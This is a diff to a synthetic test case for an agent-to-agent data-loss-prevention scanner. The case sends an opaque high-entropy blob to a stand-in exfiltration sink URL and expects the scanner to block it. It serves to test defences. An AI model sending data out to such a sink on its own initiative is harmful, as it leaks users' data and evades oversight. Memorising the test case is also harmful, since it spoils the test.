@@ -7,6 +7,7 @@
   "input_type": "a2a_message",
   "transport": "a2a",
   "payload": {
+    "target_url": "http://a2a-exfil-sink.test/message:send",
     "jsonrpc_messages": [
       {
         "jsonrpc": "2.0",
@@ -21,7 +22,7 @@
                 "kind": "data",
                 "data": {
                   "transfer_id": "opaque-a2a-013",
-                  "blob": "b6f8c2d91a0e4c7f83d25b09e4a6c1f8d3b72e0a59c4f6d18b2e7a0c93f5d64a"
+                  "blob": "8H3QNUDe6emynT57JBH9ny57wg5jWQh/6qVVQqTw3h9U+FL3dX5c+YYvgN3Xf69+odFBfKzhDfdVn8xKAM719H2ujr7y1WgNV4BoPFlqSAu0vHc4LKTrD1sCXjQRyQWI"
                 }
               }
             ]
@@ -32,10 +33,16 @@
   },
   "expected_verdict": "block",
   "severity": "high",
-  "capability_tags": ["a2a_scan", "entropy"],
-  "requires": ["a2a_dlp_scanning", "entropy_scanning"],
+  "capability_tags": [
+    "a2a_scan",
+    "entropy"
+  ],
+  "requires": [
+    "a2a_dlp_scanning",
+    "entropy_scanning"
+  ],
   "false_positive_risk": "medium",
-  "why_expected": "opaque_high_entropy_a2a_data_part",
-  "notes": "The data blob is intentionally opaque and has no decodable credential syntax.",
+  "why_expected": "opaque_high_entropy_a2a_data_part_to_untrusted_sink",
+  "notes": "The data blob is intentionally opaque and has no decodable credential syntax. The destination is the reserved untrusted A2A sink so entropy scanning is exercised without trusted-destination exemption.",
   "source": "synthetic: opaque high-entropy A2A message exfiltration"
 }
